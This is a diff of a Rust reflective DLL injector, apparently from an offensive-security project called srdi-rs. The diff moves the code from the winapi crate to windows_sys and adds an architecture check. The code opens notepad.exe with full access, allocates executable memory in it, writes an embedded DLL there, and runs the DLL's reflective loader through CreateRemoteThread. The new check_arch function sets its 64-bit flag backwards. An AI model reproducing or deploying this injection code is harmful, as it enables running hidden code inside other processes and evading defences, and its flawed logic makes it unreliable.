@@ -1,29 +1,24 @@
-use std::{ptr::null_mut, collections::BTreeMap, ffi::CStr};
-
+use std::{ptr::null_mut, collections::BTreeMap, ffi::{CStr}};
 use sysinfo::{Pid, SystemExt, ProcessExt};
-use winapi::um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER}, memoryapi::{VirtualAllocEx, WriteProcessMemory}, handleapi::CloseHandle};
+use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, IsWow64Process, CreateRemoteThread}, SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER}, Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx}}, Foundation::{BOOL, CloseHandle}};
 
 fn main() {
     env_logger::init();
     let process_id = get_process_id_by_name("notepad.exe") as u32;
     log::info!("[+] Process ID: {:}", process_id);
 
-    // Start madness
-    let dll_bytes = include_bytes!("Z:\\srdi-rs\\reflective_loader\\target\\debug\\reflective_loader.dll");
+    let dll_bytes = include_bytes!("C:\\Users\\memn0ps\\Documents\\GitHub\\srdi-rs\\reflective_loader\\target\\debug\\reflective_loader.dll");
     
     let module_base = dll_bytes.as_ptr() as usize;
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
     log::info!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);
 
     #[cfg(target_arch = "x86")]
-    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32 };
+    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32 };
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64 };
+    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
     log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);
 
-    let loader_address = get_exports_by_name(module_base as _, "memn0ps_loader".to_owned()).expect("Failed to find export");
-    log::info!("[+] Local Reflective Loader Address/offset: {:?}", loader_address);
-    // End dll madness
 
     // Get a handle to the target process with all access
     let process_handle = unsafe { 
@@ -34,11 +29,14 @@ fn main() {
         )
     };
 
-    if process_handle.is_null() {
+    if process_handle == 0 {
         panic!("Failed to open a handle to the target process");
     }
 
     log::info!("[+] Process handle: {:?}", process_handle);
+
+    //Check if target process is x64 or x86
+    check_arch(module_base, process_handle);
 
     // Allocate memory in the target process for the image
     let remote_image = unsafe { 
@@ -72,6 +70,9 @@ fn main() {
         panic!("Failed to write the image to the target process");
     }
 
+    let loader_address = get_exports_by_name(module_base as _, "memn0ps_loader".to_owned()).expect("Failed to find export");
+    log::info!("[+] Local Reflective Loader Address/offset: {:?}", loader_address);
+
     let reflective_loader = remote_image as usize + (loader_address as usize - module_base); // module_base minus to get the offset
     log::info!("[+] Remote Reflective Loader Address/offset: {:#x}", reflective_loader);
     pause();
@@ -89,14 +90,18 @@ fn main() {
         )
     };
 
-    if thread_handle == null_mut() {
+    if thread_handle == 0 {
         panic!("Failed to create remote thread");
     }
 
     // Close thread handle
     unsafe { CloseHandle(thread_handle) };
-    //unsafe { WaitForSingleObject(process_handle, 0xFFFFFFFF) };
 
+
+
+
+
+    // The following is used for debugging.
 
     let get_peb_ldr = get_exports_by_name(module_base as _, "get_peb_ldr".to_owned()).expect("Failed to find export");
     log::info!("[+] get_peb_ldr: {:#x}", remote_image as usize + (get_peb_ldr as usize - module_base));
@@ -126,13 +131,40 @@ fn main() {
     log::info!("[+] resolve_imports: {:#x}", remote_image as usize + (resolve_imports as usize - module_base));
 
 
-
     let entry_point = unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint };
     log::info!("[+] entry_point: {:#x}", remote_image as usize + entry_point as usize);
 
-
     log::info!("[+] Injection Completed");
 
+}
+
+fn check_arch(module_base: usize, process_handle: isize) {
+
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
+
+    #[cfg(target_arch = "x86")]
+    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut PIMAGE_NT_HEADERS32 };
+    #[cfg(target_arch = "x86_64")]
+    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
+    log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);
+
+    let mut target_arch_is_64: BOOL = 0;
+    let mut dll_arch_is_64: BOOL = 0;
+    
+    //If the process is a 64-bit application running under 64-bit Windows, the value is also set to FALSE.
+    if unsafe { IsWow64Process(process_handle, &mut target_arch_is_64) == 0 } {
+        panic!("Failed to call IsWow64Process");
+    }
+
+    if unsafe { (*nt_headers).OptionalHeader.Magic == 0x010B } { //PE32
+        dll_arch_is_64 = 1;
+    } else if unsafe { (*nt_headers).OptionalHeader.Magic == 0x020B } { // PE64
+        dll_arch_is_64 = 0;
+    }
+
+    if target_arch_is_64 != dll_arch_is_64 {
+        panic!("The target process and DLL are not the same architecture");
+    }
 }
 
 /// Get process ID by name
@@ -166,16 +198,16 @@ fn get_exports_by_name(module_base: *mut u8, module_name: String) -> Option<*mut
 unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
     let mut exports = BTreeMap::new();
     
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
-    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
+    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
 
     #[cfg(target_arch = "x86_64")]
-    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
+    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     let export_directory = rva_to_file_offset_pointer(module_base as usize, 
-        (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as u32) as PIMAGE_EXPORT_DIRECTORY;
+        (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as u32) as *mut IMAGE_EXPORT_DIRECTORY;
     
     let names = core::slice::from_raw_parts(
         rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNames) as *const u32,
@@ -212,19 +244,22 @@ unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
 
 unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize {
     
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
     #[cfg(target_arch = "x86")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+    
     let ref_nt_headers = &*nt_headers;
+    
     let section_header = ((&ref_nt_headers.OptionalHeader as *const _ as usize) 
-        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as PIMAGE_SECTION_HEADER;
+        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as *mut IMAGE_SECTION_HEADER;
+    
     let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
     
     for i in 0..number_of_sections as usize {
         let virt_address = (*section_header.add(i)).VirtualAddress;
-        let virt_size = (*section_header.add(i)).Misc.VirtualSize();
+        let virt_size = (*section_header.add(i)).Misc.VirtualSize;
         
         if virt_address <= rva && virt_address + virt_size > rva {
             rva -= (*section_header.add(i)).VirtualAddress;
